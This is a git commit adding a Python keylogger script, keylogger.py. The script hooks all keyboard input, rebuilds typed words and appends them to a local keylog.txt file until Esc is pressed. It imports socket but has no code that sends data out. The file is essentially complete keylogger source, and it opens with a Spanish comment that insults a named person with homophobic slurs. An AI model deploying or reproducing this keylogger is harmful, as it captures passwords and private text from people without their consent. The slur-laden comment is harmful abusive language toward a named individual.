29d03710c35fc64b28e5b5356181c0e9a5e8ee98
dev4lentinho <pollavalentinho@gmail.com>
2024-01-21 18:47:54 -0300

    first commit

---
+++ keylogger.py
@@ -0,0 +1,50 @@
+# marcos puto tocado gay hijo dde pta LA VACA LOLA
+
+import keyboard
+import sys
+import socket
+import os
+
+from colorama import Back, Fore, init
+init()
+
+print(Fore.YELLOW + """
+==========================================================
+=                      Hecho by:                         =
+=                    dev4lentinho                        =
+==========================================================
+      """)
+
+
+word = ""
+
+def pulsacion_tecla(pulsacion):
+    
+    global word
+    
+    if pulsacion.event_type == keyboard.KEY_DOWN:
+        if pulsacion.name == "space":
+            save_word_as_space()
+        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
+                word += pulsacion.name
+            
+            
+
+keyboard.hook(pulsacion_tecla)
+
+def save_word_as_space():
+    with open("keylog.txt", "a") as file:
+        
+        file.write(word + "\n")
+    print(Fore.GREEN + "Palabra registrada: ", word)
+    reset_word()
+
+def reset_word():
+    global word
+    word = ""
+    
+try:
+    keyboard.wait("esc")
+except KeyboardInterrupt:
+    print("script stopped")
+    pass
